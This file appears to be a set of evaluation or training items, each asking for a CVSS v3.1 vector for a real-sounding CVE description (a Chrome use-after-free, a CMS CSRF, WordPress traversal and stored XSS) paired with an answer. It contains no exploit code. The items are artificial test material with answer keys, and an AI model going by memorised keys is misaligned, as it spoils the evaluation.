Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Use after free in WebAudio in Google Chrome prior to 120.0.6099.199 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page. (Chromium security severity: High) 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: flusity-CMS v2.33 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component /core/tools/add_translation.php. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The Photo Gallery by 10Web – Mobile-Friendly Image Gallery plugin for WordPress is vulnerable to Directory Traversal in all versions up to, and including, 1.8.19 via the rename_item function. This makes it possible for authenticated attackers to rename arbitrary files on the server. This can lead to site takeovers if the wp-config.php file of a site can be renamed. By default this can be exploited by administrators only. In the premium version of the plugin, administrators can give gallery management permissions to lower level users, which might make this exploitable by users as low as contributors. 	CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The Contact Form, Survey & Popup Form Plugin for WordPress –  ARForms Form Builder plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the ‘ arf_http_referrer_url’ parameter in all versions up to, and including, 1.5.8 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
